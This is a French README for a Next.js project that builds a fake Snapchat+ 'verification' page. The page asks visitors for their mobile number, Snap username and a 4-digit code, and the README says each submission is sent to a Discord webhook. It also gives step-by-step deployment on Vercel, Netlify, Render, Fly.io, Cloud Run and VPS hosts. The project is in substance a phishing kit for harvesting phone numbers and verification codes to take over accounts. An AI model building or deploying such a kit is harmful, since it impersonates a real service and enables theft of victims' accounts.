# Snap + Tech

Site one-page de vérification Snapchat+ (numéro mobile + pseudo Snap → code à 4 chiffres → écran succès).
Thème noir/jaune, animations Framer Motion, logs Discord via webhook.

## Stack

- **Next.js 16** (App Router) + TypeScript
- **Tailwind CSS 4** + shadcn/ui
- **Framer Motion** pour les animations
- **input-otp** pour le code 4 chiffres
- Route API `/api/log` qui forward vers un webhook Discord

## Démarrage local

```bash
# 1. Installer les dépendances
npm install --legacy-peer-deps

# 2. Configurer le webhook Discord
cp .env.example .env.local
# Édite .env.local et colle ton URL de webhook Discord :
#   DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/XXXX/XXXX

# 3. Lancer le serveur dev
npm run dev
# Ouvre http://localhost:3000
```

## Déploiement — compatible tous hébergeurs

Ce repo marche **partout** — pick ton hébergeur préféré :

### 🟢 Vercel (le plus simple)
1. Crée un repo GitHub avec ce code
2. Va sur [vercel.com](https://vercel.com) > "Add New Project" > importe ton repo
3. Environment Variables : `DISCORD_WEBHOOK_URL` = ton URL webhook
4. Deploy — fini. `vercel.json` déjà inclus.

### 🟢 Netlify
1. Repo GitHub prêt
2. Sur [netlify.com](https://netlify.com) > "Add new site" > "Import from Git"
3. Environment variables : `DISCORD_WEBHOOK_URL`
4. Deploy. `netlify.toml` déjà inclus.

### 🟢 Render
1. Repo GitHub prêt
2. Sur [render.com](https://render.com) > "New +" > "Web Service" > connecte ton repo
3. Render lit `render.yaml` automatiquement
4. Dans le dashboard, set la variable `DISCORD_WEBHOOK_URL`
5. Deploy.

### 🟢 Railway
1. Repo GitHub prêt
2. Sur [railway.app](https://railway.app) > "New Project" > "Deploy from GitHub repo"
3. Variables : `DISCORD_WEBHOOK_URL`
4. Railway auto-detecte Next.js.

### 🟢 Fly.io (Docker)
```bash
# Installe flyctl : https://fly.io/docs/hands-on/install-flyctl/
fly launch        # fly lit fly.toml + Dockerfile
fly secrets set DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/XXXX/XXXX
fly deploy
```

### 🟢 Cloud Run (Google Cloud)
```bash
gcloud builds submit --tag gcr.io/TON-PROJECT/snap-tech
gcloud run deploy snap-tech \
  --image gcr.io/TON-PROJECT/snap-tech \
  --set-env-vars "DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/XXXX/XXXX" \
  --allow-unauthenticated
```

### 🟢 N'importe quel VPS (Docker)
```bash
git clone https://github.com/TON-PSEUDO/snap-tech.git
cd snap-tech
docker build -t snap-tech .
docker run -d -p 80:3000 -e DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/XXXX/XXXX snap-tech
```

### 🟢 Hébergement classique (Node.js)
```bash
git clone https://github.com/TON-PSEUDO/snap-tech.git
cd snap-tech
npm install --legacy-peer-deps
npm run build
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/XXXX/XXXX npm run start
# Utilise PM2 pour le garder en vie : pm2 start "npm run start" --name snap-tech
```

## Responsive

Le site est conçu mobile-first et fonctionne sur :
- ✅ iPhone (Safari iOS 14+) — notch géré via safe-area-inset
- ✅ Android (Chrome)
- ✅ Tablettes (iPad / Android)
- ✅ Desktop (Chrome, Firefox, Safari, Edge)

Breakpoints Tailwind : `sm: 640px`, `md: 768px`, `lg: 1024px`.

## Logs Discord

Le webhook reçoit 2 types d'events seulement :

1. **📝 Nouvelle inscription** (quand le formulaire est soumis)
   - Numéro complet
   - Pseudo Snap

2. **🔑 Code saisi** (quand le code à 4 chiffres est validé)
   - Code complet
   - Numéro complet
   - Pseudo Snap

## Fichiers clés

- `src/app/page.tsx` — page unique (UI + logique + logger client)
- `src/app/api/log/route.ts` — route POST qui forward vers Discord
- `src/app/layout.tsx` — layout root + viewport meta
- `public/snap-logo.svg` — logo fantôme jaune Snap+
- `next.config.ts` — config Next.js
- `Dockerfile` — pour conteneurs (Fly.io, Cloud Run, VPS)
- `vercel.json` — config Vercel
- `netlify.toml` — config Netlify
- `render.yaml` — config Render
- `fly.toml` — config Fly.io

## License

MIT — fais ce que tu veux.
